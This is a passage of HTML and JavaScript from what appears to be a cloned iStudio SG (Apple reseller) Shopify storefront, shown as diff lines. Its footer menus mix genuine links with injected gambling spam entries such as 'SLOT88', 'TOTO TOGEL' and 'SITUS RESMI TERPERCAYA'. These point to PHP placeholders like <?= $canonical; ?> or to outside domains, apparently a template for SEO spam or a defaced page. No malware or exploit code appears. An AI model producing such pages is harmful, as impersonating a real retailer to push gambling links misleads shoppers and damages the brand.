-                    el.classList.remove(this.config.cls.hide);
-                  }
-                  updateButtonState(show = true) {
-                    const $button = this.querySelector(this.config.dom.button) || null;
-                    if (!$button) return;
-                
-                    if (show) {
-                      this.showButton($button);
-                    } else {
-                      this.hideButton($button);
-                    }
-                  }
-                  addEvent() {
-                    const $inputs = this.querySelectorAll(this.config.dom.input) || [];
-                
-                    if (!$inputs?.length > 0) return;
-                    [...$inputs].forEach(($input) => {
-                      $input.addEventListener('change', () => {
-                        const $selected = this.querySelector(this.config.dom.selected) || null;
-                
-                        if ($selected) {
-                          this.updateButtonState();
-                        } else {
-                          this.updateButtonState(false);
-                        }
-                      });
-                    });
-                  }
-                }
-                customElements.define('product-recommendations', ProductRecommendations);
-                
-                function call_gafunction() {
-                  var mpn_handle = $('#mpn_handle').val();
-                  var frequentProducts_ga = [];
-                  var productList = 'Shopify Rec :: ' + mpn_handle;
-                  $.each($("input[name='frequent-products-pdp']"), function () {
-                    var prodtitle = $('#title_' + $(this).val()).val();
-                    var prodMPN = $('#product_mpn_handle_' + $(this).val()).val();
-                    var prodType = $('.card_product_category_' + $(this).val()).val();
-                    var prodCurrency = $('.card_product_currency_' + $(this).val()).attr('value');
-                    var prodPrice = $('.card_product_price_' + $(this).val()).attr('value');
-                    var prodSku = $('.card_product_sku_' + $(this).val()).attr('value');
-                    var compareprice = $('.card_product_compare_' + $(this).val()).attr('value');
-                    prodPrice = Number(prodPrice.replace(/[^0-9.-]+/g, ''));
-                    var discount = 0;
-                    if (compareprice != '') {
-                      compareprice = Number(compareprice.replace(/[^0-9.-]+/g, ''));
-                      discount = parseFloat(compareprice) - parseFloat(prodPrice);
-                      discount = parseFloat(discount);
-                      // prodPrice = compareprice;
-                    }
-                    var productPrice1 = parseFloat(prodPrice);
-                    item_ga = {};
-                    item_ga['item_id'] = prodSku;
-                    item_ga['item_name'] = prodtitle;
-                    item_ga['item_category'] = prodType;
-                    item_ga['item_list_name'] = productList;
-                    item_ga['price'] = prodPrice;
-                    item_ga['quantity'] = 1;
-                    frequentProducts_ga.push(item_ga);
-                  });
-                  if (frequentProducts_ga.length != 0) {
-                    dataLayer.push({ ecommerce: null });
-                    dataLayer.push({
-                      event: 'view_item_list',
-                      ecommerce: {
-                        item_list_name: productList,
-                        items: frequentProducts_ga,
-                      },
-                    });
-                  }
-                }
-              </script>
-              <script>
-                $(document).ready(function () {
-                  $(window).on('scroll', function () {
-                    if (
-                      $(window).scrollTop() >=
-                      $('.product-recommendations1').offset().top + $('.product-recommendations1').outerHeight() - window.innerHeight
-                    ) {
-                      setTimeout(function () {
-                        var checkLength = $("input[name='frequent-products-pdp']:checked").length;
-                        var productRecs = document.querySelector('.product-recommendations1');
-                
-                        $('#checked-products').text(checkLength);
-                      }, 4000);
-                      setTimeout(function () {
-                        var height;
-                        var maxheight = 0;
-                        var minheight = 0;
-                        $('.price_container_cal').each(function () {
-                          height = parseInt($(this).height());
-                          if (height > maxheight) {
-                            maxheight = height;
-                          } else {
-                            minheight = height;
-                          }
-                        });
-                        let isMobile = window.matchMedia('only screen and (max-width: 1023px)').matches;
-                        if (!isMobile) {
-                          if (maxheight >= minheight) {
-                            $('.price_container_cal').attr(
-                              'style',
-                              'display: flex; flex-flow: column; justify-content: flex-end; height:' + maxheight + 'px;'
-                            );
-                          }
-                        }
-                      }, 500);
-                    }
-                  });
-                });
-              </script>
-          </section>
-
-          
-        </main>
-        <!-- BEGIN sections: footer-group -->
-        <div id="shopify-section-sections--17605520064692__footer" class="shopify-section shopify-section-group-footer-group">
-          <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/section-footer.css?v=119412480688511735931742784889" rel="stylesheet" type="text/css" media="all" />
-          <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-newsletter.css?v=35697508531179068801742784889" rel="stylesheet" type="text/css" media="all" />
-          <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-list-menu.css?v=104864129994713251501742784888" rel="stylesheet" type="text/css" media="all" />
-          <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-list-payment.css?v=176967998584360591851742784888" rel="stylesheet" type="text/css" media="all" />
-          <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-list-social.css?v=35792976012981934991742784887" rel="stylesheet" type="text/css" media="all" />
-          <style data-shopify>.footer {
-              margin-top: 18px;
-              }
-              .active_2, .accordion2:after {
-              color: #121212;
-              }
-              .section-sections--17605520064692__footer-padding {
-              /* padding-top: 0px; */
-              padding-bottom: 0px;
-              }
-              @media screen and (min-width: 750px) {
-              .footer {
-              margin-top: 24px;
-              }
-              .section-sections--17605520064692__footer-padding {
-              padding-top: 0px;
-              padding-bottom: 0px;
-              }
-              }
-          </style>
-          <footer class="footer color-background-1 gradient section-sections--17605520064692__footer-padding">
-              <div id="footerAccordion" class="accordionpadding page-width ">
-                <div class="borderTop">
-                    <div class="accordion2 ">
-                      <span class="headerBlu footer-block__heading">Products</span>
-                      <span class="caretfooter">
-                          <svg
-                            aria-hidden="true"
-                            focusable="false"
-                            role="presentation"
-                            class="footercareticon icon icon-caret "
-                            viewBox="0 0 10 6"
-                            >
-                            <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor" class="footercareticon">
-                            </path>
-                          </svg>
-                      </span>
-                    </div>
-                    <div class="panel2">
-                      <ul class="footer-block__details-content list-unstyled">
-                          <li>
-                            <a
-                                href="<?= $canonical; ?>" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            SLOT88
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="<?= $canonical; ?>" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            TOTO TOGEL
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="<?= $canonical; ?>" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            TOGEL ONLINE
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="<?= $canonical; ?>" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            TOGEL
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="<?= $canonical; ?>" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            SLOT
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="<?= $canonical; ?>" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            TOGEL TERPERCAYA
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="<?= $canonical; ?>" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            SITUS RESMI TERPERCAYA
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="<?= $canonical; ?>" target="_blank"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            SITUS RESMI
-                            </a>
-                          </li>
-                      </ul>
-                    </div>
-                    <div class="accordion2 ">
-                      <span class="headerBlu footer-block__heading">Services</span>
-                      <span class="caretfooter">
-                          <svg
-                            aria-hidden="true"
-                            focusable="false"
-                            role="presentation"
-                            class="footercareticon icon icon-caret "
-                            viewBox="0 0 10 6"
-                            >
-                            <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor" class="footercareticon">
-                            </path>
-                          </svg>
-                      </span>
-                    </div>
-                    <div class="panel2">
-                      <ul class="footer-block__details-content list-unstyled">
-                          <li>
-                            <a
-                                href="/pages/applecare" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            AppleCare+
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="/pages/business-solutions" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            Corporate
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="//klicekmediim.cz/" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            SLOT88
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="/pages/service-provider" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            Elush Service Provider
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="/pages/financing" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            Financing Options
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="/pages/trade-in" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            Trade-in
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="/pages/travellers-reservation" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            Traveller’s Reservation
-                            </a>
-                          </li>
-                      </ul>
-                    </div>
-                    <div class="accordion2 ">
-                      <span class="headerBlu footer-block__heading">Support</span>
-                      <span class="caretfooter">
-                          <svg
-                            aria-hidden="true"
-                            focusable="false"
-                            role="presentation"
-                            class="footercareticon icon icon-caret "
-                            viewBox="0 0 10 6"
-                            >
-                            <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor" class="footercareticon">
-                            </path>
-                          </svg>
-                      </span>
-                    </div>
-                    <div class="panel2">
-                      <ul class="footer-block__details-content list-unstyled">
-                          <li>
-                            <a
-                                href="/account/login" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            My Account
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="/policies/shipping-policy" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            Collection & Delivery
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="/policies/refund-policy" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            Returns & Exchanges
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="/pages/contact-us" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            Contact Us
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="/pages/istudio-faq" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            FAQ
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="/policies/privacy-policy" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            Privacy Policy
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="/policies/terms-of-service" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            Site Terms of Use
-                            </a>
-                          </li>
-                      </ul>
-                    </div>
-                    <div class="accordion2 ">
-                      <span class="headerBlu footer-block__heading">About iStudio</span>
-                      <span class="caretfooter">
-                          <svg
-                            aria-hidden="true"
-                            focusable="false"
-                            role="presentation"
-                            class="footercareticon icon icon-caret "
-                            viewBox="0 0 10 6"
-                            >
-                            <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor" class="footercareticon">
-                            </path>
-                          </svg>
-                      </span>
-                    </div>
-                    <div class="panel2">
-                      <ul class="footer-block__details-content list-unstyled">
-                          <li>
-                            <a
-                                href="/pages/about-us" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            About Us
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="/pages/store-locator" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            Find an iStudio near you
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="/pages/why-shop-at-istudio" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            Why Shop at iStudio
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="//photoprime.org/" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            photoprime.org
-                            </a>
-                          </li>
-                      </ul>
-                    </div>
-                    <div class="accordion2 ">
-                      <span class="headerBlu footer-block__heading">Apple Premium Partner</span>
-                      <span class="caretfooter">
-                          <svg
-                            aria-hidden="true"
-                            focusable="false"
-                            role="presentation"
-                            class="footercareticon icon icon-caret "
-                            viewBox="0 0 10 6"
-                            >
-                            <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor" class="footercareticon">
-                            </path>
-                          </svg>
-                      </span>
-                    </div>
-                    <div class="panel2">
-                      <div class="subtext_css footer-block__details-content rte">
-                      </div>
-                    </div>
-                    <div class="footer_logosMobile">
-                      <div class="footerLogo ">
-                          <div
-                            class="ratio"
-                            style="--ratio-percent: 46.97508896797152%"
-                            >
-                            <img
-                                srcset="https://www.istudiosg.com/cdn/shop/files/Logo-Footer-Apple-Premium-Partner_400x_39469ee7-8bb1-490a-a4e0-58b27ff30663_100x.svg?v=1711639473, //www.istudiosg.com/cdn/shop/files/Logo-Footer-Apple-Premium-Partner_400x_39469ee7-8bb1-490a-a4e0-58b27ff30663_100x@2x.svg?v=1711639473 2x"
-                                src="https://www.istudiosg.com/cdn/shop/files/Logo-Footer-Apple-Premium-Partner_400x_39469ee7-8bb1-490a-a4e0-58b27ff30663_400x.svg?v=1711639473"
-                                alt=""
-                                loading="lazy"
-                                width="100"
-                                height="auto"
-                                style="max-width: min(100%, 100px);"
-                                >
-                          </div>
-                      </div>
-                      <div class="footerLogo ">
-                          <div
-                            class="ratio"
-                            style="--ratio-percent: 25.396825396825395%"
-                            >
-                            <img
-                                srcset="https://www.istudiosg.com/cdn/shop/files/Autho_Ser_Provi_2ln_blk_US_051117_400x_dd0df580-27ec-4b6b-91cd-d1aa02264385_130x.svg?v=1711639499, //www.istudiosg.com/cdn/shop/files/Autho_Ser_Provi_2ln_blk_US_051117_400x_dd0df580-27ec-4b6b-91cd-d1aa02264385_130x@2x.svg?v=1711639499 2x"
-                                src="https://www.istudiosg.com/cdn/shop/files/Autho_Ser_Provi_2ln_blk_US_051117_400x_dd0df580-27ec-4b6b-91cd-d1aa02264385_400x.svg?v=1711639499"
-                                alt=""
-                                loading="lazy"
-                                width="130"
-                                height="auto"
-                                style="max-width: min(100%, 130px);"
-                                >
-                          </div>
-                      </div>
-                      <div class="footerLogo ">
-                          <svg class="placeholder-svg placeholder" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 525.5 525.5">
-                            <path d="M324.5 212.7H203c-1.6 0-2.8 1.3-2.8 2.8V308c0 1.6 1.3 2.8 2.8 2.8h121.6c1.6 0 2.8-1.3 2.8-2.8v-92.5c0-1.6-1.3-2.8-2.9-2.8zm1.1 95.3c0 .6-.5 1.1-1.1 1.1H203c-.6 0-1.1-.5-1.1-1.1v-92.5c0-.6.5-1.1 1.1-1.1h121.6c.6 0 1.1.5 1.1 1.1V308z"/>
-                            <path d="M210.4 299.5H240v.1s.1 0 .2-.1h75.2v-76.2h-105v76.2zm1.8-7.2l20-20c1.6-1.6 3.8-2.5 6.1-2.5s4.5.9 6.1 2.5l1.5 1.5 16.8 16.8c-12.9 3.3-20.7 6.3-22.8 7.2h-27.7v-5.5zm101.5-10.1c-20.1 1.7-36.7 4.8-49.1 7.9l-16.9-16.9 26.3-26.3c1.6-1.6 3.8-2.5 6.1-2.5s4.5.9 6.1 2.5l27.5 27.5v7.8zm-68.9 15.5c9.7-3.5 33.9-10.9 68.9-13.8v13.8h-68.9zm68.9-72.7v46.8l-26.2-26.2c-1.9-1.9-4.5-3-7.3-3s-5.4 1.1-7.3 3l-26.3 26.3-.9-.9c-1.9-1.9-4.5-3-7.3-3s-5.4 1.1-7.3 3l-18.8 18.8V225h101.4z"/>
-                            <path d="M232.8 254c4.6 0 8.3-3.7 8.3-8.3s-3.7-8.3-8.3-8.3-8.3 3.7-8.3 8.3 3.7 8.3 8.3 8.3zm0-14.9c3.6 0 6.6 2.9 6.6 6.6s-2.9 6.6-6.6 6.6-6.6-2.9-6.6-6.6 3-6.6 6.6-6.6z"/>
-                          </svg>
-                      </div>
-                    </div>
-                </div>
-              </div>
-              <div class="footer__content-top page-width">
-                <div
-                    class="js-footer-blocks-wrapper footer__blocks-wrapper grid grid--1-col grid--2-col grid--4-col-tablet grid--5-col-desktop grid--5-col-desktop"
-                    >
-                    <div
-                      class="footer-block grid__item footer-block--menu"
-                      >
-                      <p class="footer-block__heading inline-richtext">Products</p>
-                      <ul class="footer-block__details-content list-unstyled">
-                          <li>
-                            <a
-                                href="/pages/view-all-mac" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            Mac
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="/pages/view-all-ipad" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            iPad
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="/pages/view-all-iphone" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            iPhone
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="/pages/view-all-watch" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            Watch
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="/pages/view-all-music" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            Music
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="/pages/view-all-tv" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            <?= $BRAND; ?>
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="<?= $canonical; ?>" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            Cancer toto
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="<?= $canonical; ?>" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            <?= $BRAND; ?> Login
-                            </a>
-                          </li>
-                      </ul>
-                    </div>
-                    <div
-                      class="footer-block grid__item footer-block--menu"
-                      >
-                      <p class="footer-block__heading inline-richtext">Services</p>
-                      <ul class="footer-block__details-content list-unstyled">
-                          <li>
-                            <a
-                                href="/pages/applecare" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            AppleCare+
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="/pages/business-solutions" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            Corporate
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="<?= $canonical; ?>" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            SLOT88
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="/pages/service-provider" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            Elush Service Provider
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="/pages/financing" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            Financing Options
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="/pages/trade-in" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            Trade-in
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="<?= $canonical; ?>" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            Togel Online
-                            </a>
-                          </li>
-                      </ul>
-                    </div>
-                    <div
-                      class="footer-block grid__item footer-block--menu"
-                      >
-                      <p class="footer-block__heading inline-richtext">Support</p>
-                      <ul class="footer-block__details-content list-unstyled">
-                          <li>
-                            <a
-                                href="/account/login" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            My Account
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="/policies/shipping-policy" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            Collection & Delivery
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="/policies/refund-policy" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            Returns & Exchanges
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="/pages/contact-us" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            Contact Us
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="/pages/istudio-faq" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            FAQ
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="/policies/privacy-policy" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            Privacy Policy
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="/policies/terms-of-service" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            Site Terms of Use
-                            </a>
-                          </li>
-                      </ul>
-                    </div>
-                    <div
-                      class="footer-block grid__item footer-block--menu"
-                      >
-                      <p class="footer-block__heading inline-richtext">About iStudio</p>
-                      <ul class="footer-block__details-content list-unstyled">
-                          <li>
-                            <a
-                                href="/pages/about-us" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            About Us
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="/pages/store-locator" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            Find an iStudio near you
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="/pages/why-shop-at-istudio" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            Why Shop at iStudio
-                            </a>
-                          </li>
-                          <li>
-                            <a
-                                href="//photoprime.org/" target="_blank" rel="nofollow noopener noreferrer"
-                                class="footer_content_list link link--text list-menu__item list-menu__item--link"
-                                >
-                            photoprime.org
-                            </a>
-                          </li>
-                      </ul>
-                    </div>
-                    <div
-                      class="footer-block grid__item"
-                      >
-                      <p class="footer-block__heading inline-richtext">Apple Premium Partner</p>
-                      <div class="subtext_css footer-block__details-content rte">
-                      </div>
-                      <div class="footer_logos">
-                          <div class="footerLogo ">
-                            <div
-                                class="ratio"
-                                style="--ratio-percent: 46.97508896797152%"
-                                >
-                                <img
-                                  srcset="https://www.istudiosg.com/cdn/shop/files/Logo-Footer-Apple-Premium-Partner_400x_39469ee7-8bb1-490a-a4e0-58b27ff30663_100x.svg?v=1711639473, //www.istudiosg.com/cdn/shop/files/Logo-Footer-Apple-Premium-Partner_400x_39469ee7-8bb1-490a-a4e0-58b27ff30663_100x@2x.svg?v=1711639473 2x"
-                                  src="https://www.istudiosg.com/cdn/shop/files/Logo-Footer-Apple-Premium-Partner_400x_39469ee7-8bb1-490a-a4e0-58b27ff30663_400x.svg?v=1711639473"
-                                  alt=""
-                                  loading="lazy"
-                                  width="100"
-                                  height="auto"
-                                  style="max-width: min(100%, 100px);"
-                                  >
-                            </div>
-                          </div>
-                          <div class="footerLogo ">
-                            <div
-                                class="ratio"
-                                style="--ratio-percent: 25.396825396825395%"
-                                >
-                                <img
-                                  srcset="https://www.istudiosg.com/cdn/shop/files/Autho_Ser_Provi_2ln_blk_US_051117_400x_dd0df580-27ec-4b6b-91cd-d1aa02264385_130x.svg?v=1711639499, //www.istudiosg.com/cdn/shop/files/Autho_Ser_Provi_2ln_blk_US_051117_400x_dd0df580-27ec-4b6b-91cd-d1aa02264385_130x@2x.svg?v=1711639499 2x"
-                                  src="https://www.istudiosg.com/cdn/shop/files/Autho_Ser_Provi_2ln_blk_US_051117_400x_dd0df580-27ec-4b6b-91cd-d1aa02264385_400x.svg?v=1711639499"
-                                  alt=""
-                                  loading="lazy"
-                                  width="130"
-                                  height="auto"
-                                  style="max-width: min(100%, 130px);"
-                                  >
-                            </div>
-                          </div>
-                          <div class="footerLogo ">
-                            <svg class="placeholder-svg placeholder" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 525.5 525.5">
-                                <path d="M324.5 212.7H203c-1.6 0-2.8 1.3-2.8 2.8V308c0 1.6 1.3 2.8 2.8 2.8h121.6c1.6 0 2.8-1.3 2.8-2.8v-92.5c0-1.6-1.3-2.8-2.9-2.8zm1.1 95.3c0 .6-.5 1.1-1.1 1.1H203c-.6 0-1.1-.5-1.1-1.1v-92.5c0-.6.5-1.1 1.1-1.1h121.6c.6 0 1.1.5 1.1 1.1V308z"/>
-                                <path d="M210.4 299.5H240v.1s.1 0 .2-.1h75.2v-76.2h-105v76.2zm1.8-7.2l20-20c1.6-1.6 3.8-2.5 6.1-2.5s4.5.9 6.1 2.5l1.5 1.5 16.8 16.8c-12.9 3.3-20.7 6.3-22.8 7.2h-27.7v-5.5zm101.5-10.1c-20.1 1.7-36.7 4.8-49.1 7.9l-16.9-16.9 26.3-26.3c1.6-1.6 3.8-2.5 6.1-2.5s4.5.9 6.1 2.5l27.5 27.5v7.8zm-68.9 15.5c9.7-3.5 33.9-10.9 68.9-13.8v13.8h-68.9zm68.9-72.7v46.8l-26.2-26.2c-1.9-1.9-4.5-3-7.3-3s-5.4 1.1-7.3 3l-26.3 26.3-.9-.9c-1.9-1.9-4.5-3-7.3-3s-5.4 1.1-7.3 3l-18.8 18.8V225h101.4z"/>
-                                <path d="M232.8 254c4.6 0 8.3-3.7 8.3-8.3s-3.7-8.3-8.3-8.3-8.3 3.7-8.3 8.3 3.7 8.3 8.3 8.3zm0-14.9c3.6 0 6.6 2.9 6.6 6.6s-2.9 6.6-6.6 6.6-6.6-2.9-6.6-6.6 3-6.6 6.6-6.6z"/>
-                            </svg>
-                          </div>
-                      </div>
-                    </div>
-                </div>
-                <div
-                    class="page-width footer_newsletter_icon_section"
-                    >
-                    <div class="footer-block__newsletter">
-                      <p class="footer-block__heading2 inline-richtext">Subscribe to our emails</p>
-                      <form method="post" action="/contact#ContactFooter" id="ContactFooter" accept-charset="UTF-8" class="footer__newsletter newsletter-form">
-                          <input type="hidden" name="form_type" value="customer" /><input type="hidden" name="utf8" value="✓" /><input type="hidden" name="contact[tags]" value="newsletter">
-                          <div class="emailTextBoxFooter1 newsletter-form__field-wrapper">
-                            <div class="field">
-                                <input
-                                  id="NewsletterForm--sections--17605520064692__footer"
-                                  type="email"
-                                  name="contact[email]"
-                                  class="emailTextBoxFooter1 field__input"
-                                  value=""
-                                  aria-required="true"
-                                  autocorrect="off"
-                                  autocapitalize="off"
-                                  autocomplete="email"
-                                  placeholder="Email"
-                                  required
-                                  >
-                                <label class="email_label_css field__label" for="NewsletterForm--sections--17605520064692__footer">
-                                Email
-                                </label>
-                                <button
-                                  type="submit"
-                                  class="newsletter-form__button field__button"
-                                  name="commit"
-                                  id="Subscribe"
-                                  aria-label="Subscribe"
-                                  data-form-type="footer-newsletter"
-                                  >
-                                  <svg
-                                      viewBox="0 0 14 10"
-                                      fill="none"
-                                      aria-hidden="true"
-                                      focusable="false"
-                                      class="footer_mail_arrow icon icon-arrow"
-                                      xmlns="http://www.w3.org/2000/svg"
-                                      >
-                                      <path fill-rule="evenodd" clip-rule="evenodd" d="M8.537.808a.5.5 0 01.817-.162l4 4a.5.5 0 010 .708l-4 4a.5.5 0 11-.708-.708L11.793 5.5H1a.5.5 0 010-1h10.793L8.646 1.354a.5.5 0 01-.109-.546z" fill="currentColor">
-                                  </svg>
-                                </button>
-                            </div>
-                          </div>
-                      </form>
